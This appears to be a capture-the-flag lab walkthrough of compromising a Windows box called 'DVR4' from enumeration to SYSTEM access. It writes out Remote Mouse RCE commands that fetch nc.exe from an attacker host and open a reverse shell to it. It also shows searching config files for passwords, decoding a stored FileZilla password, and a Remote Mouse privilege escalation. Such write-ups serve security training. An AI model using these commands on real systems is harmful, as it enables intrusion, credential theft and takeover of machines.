##### Tags: `remotemouse`  `id_rsa`  `.xml`  `RDP`  `FileZilla`

# 🪟 DVR4 🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.142.199

PORT     STATE SERVICE        VERSION
1978/tcp open  remotemouse    Emote Remote Mouse
1979/tcp open  unisql-java?
1980/tcp open  pearldoc-xact?
3389/tcp open  ms-wbt-server  Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
port 1978 is running remotemouse  
found the script for RCE  
https://www.exploit-db.com/exploits/46697  
uplaod nc.exe
```console
python3 RemoteMouse-3.008-Exploit.py --target-ip 192.168.142.199 --cmd "powershell -c \"curl http://192.168.45.209/nc.exe -o C:/Users/Public/nc.exe\""
```
revershell
```console
python3 RemoteMouse-3.008-Exploit.py --target-ip 192.168.142.199 --cmd "powershell -c \"C:/Users/Public/nc.exe 192.168.45.209 80 -e cmd\""
```
```console
$ penelope -p 80
[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 10.0.2.15 • 192.168.45.209
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from REMOTE-PC 192.168.142.199 Microsoft_Windows_10_Pro-x64-based_PC 👤 remote-pc\divine • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/REMOTE-PC~192.168.142.199-Microsoft_Windows_10_Pro-x64-based_PC/2026_04_05-20_52_50-021.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Users\divine>whoami

remote-pc\divine
```
## Privilege Escalation
upload winpeas but nothing found  
so i check all xml and found the password
```console
C:\Users\divine>findstr /SIM /C:"pass" *.ini *.cfg *.xml

AppData\Roaming\FileZilla\filezilla.xml
AppData\Roaming\FileZilla\recentservers.xml
```
```console
C:\Users\divine>type AppData\Roaming\FileZilla\recentservers.xml

<?xml version="1.0" encoding="UTF-8"?>
<FileZilla3 version="3.54.1" platform="windows">
        <RecentServers>
                <Server>
                        <Host>ftp.pg</Host>
                        <Port>21</Port>
                        <Protocol>0</Protocol>
                        <Type>0</Type>
                        <User>divine</User>
                        <Pass encoding="base64">Q29udHJvbEZyZWFrMTE=</Pass>
                        <Logontype>1</Logontype>
                        <PasvMode>MODE_DEFAULT</PasvMode>
                        <EncodingType>Auto</EncodingType>
                        <BypassProxy>0</BypassProxy>
                </Server>
        </RecentServers>
</FileZilla3>
```
base64 decode the password
```console
ControlFreak11
```
port 3389 is open so we can login remotely  
there is a privilege escalation for remote mouse  
https://www.exploit-db.com/exploits/50047
```console
# CVE: CVE-2021-35448

Steps to reproduce:

1. Open Remote Mouse from the system tray
2. Go to "Settings"
3. Click "Change..." in "Image Transfer Folder" section
4. "Save As" prompt will appear
5. Enter "C:\Windows\System32\cmd.exe" in the address bar
6. A new command prompt is spawned with Administrator privileges
```
follow the step in RDP and we got the system shell
```console
C:\WINDOWS\system32>whoami
nt authority\system
```
